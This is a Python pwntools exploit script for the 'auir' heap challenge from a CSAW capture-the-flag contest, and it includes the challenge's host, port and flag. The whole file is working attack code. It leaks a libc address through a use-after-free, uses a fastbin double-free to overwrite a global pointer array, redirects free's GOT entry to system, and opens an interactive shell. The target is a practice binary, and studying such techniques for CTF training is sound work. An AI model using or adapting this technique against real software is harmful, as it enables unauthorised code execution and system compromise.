from pwn import *

'''
HOST = pwn.chal.csaw.io
PORT = 7713
PoC:  https://asciinema.org/a/IARN4KoGyVYbDai3Je3dXJM95
Flag: flag{W4rr10rs!_A1ur_4wa1ts_y0u!_M4rch_f0rth_and_t4k3_1t!}
'''

free_got = 0x605060
sys_off  = 0x45390
sh_off   = 0x18cd17
# bss pointer to use for the fastbin attack
bss      = 0x6052ed

def alloc(size, data):

    r.sendlineafter('>>', '1')
    r.sendlineafter('>>', str(size))
    r.sendlineafter('>>', data)

    return

def dump(idx):

    r.sendlineafter('>>', '4')
    r.sendlineafter('>>', str(idx))

    r.recvuntil('SHOWING....\n')

    return u64(r.recv(6).ljust(8, '\x00'))

def free(idx):

    r.sendlineafter('>>', '2')
    r.sendlineafter('>>', str(idx))

    return

def edit(idx, size, data):

    r.sendlineafter('>>', '3')
    r.sendlineafter('>>', str(idx))
    r.sendlineafter('>>', str(size))
    r.sendlineafter('>>', data)

    return

def pwn():
    
    # allocate small chunks in order for them to get populated
    # with pointers to libc once they are free'd
    alloc(0x80, 'A'*10) # chunk 1
    alloc(0x80, 'B'*10) # chunk 2

    free(0)
    
    # UAF
    leak        = dump(0)
    libc        = leak - 0x3c4b78
    system      = libc + sys_off
    binsh       = libc + sh_off

    log.info("Leak:        0x{:x}".format(leak))
    log.info("Libc:        0x{:x}".format(libc))
    log.info("system:      0x{:x}".format(system))

    # fresh start - consolidate free chunks
    free(1)

    alloc(0x60, 'C'*10) # chunk 3
    alloc(0x60, 'D'*10) # chunk 4
    alloc(0x80, 'E'*10) # chunk 5

    # double-free bug => fastbin attack
    free(3)
    free(2)
    free(3)

    # make malloc return 0x6052ed so we can overwrite the
    # entries in the global pointer array
    payload = p64(bss)
    alloc(0x68, payload)
    alloc(0x68, "F")
    alloc(0x68, "G")
    # overwrite the 1st entry with free's got entry
    # and the 2nd entry with binsh's address
    alloc(0x68,"H"*0x13 + p64(free_got) + p64(binsh))

    # free => system
    edit(0, 8, p64(system))

    # call system with the 2nd entry as argument, which is binsh
    free(1)

    r.interactive()

if __name__ == "__main__":
    log.info("For remote: {} HOST PORT".format(sys.argv[0]))
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        pwn()
    else:
        r = process('./auir')
        pause()
        pwn()
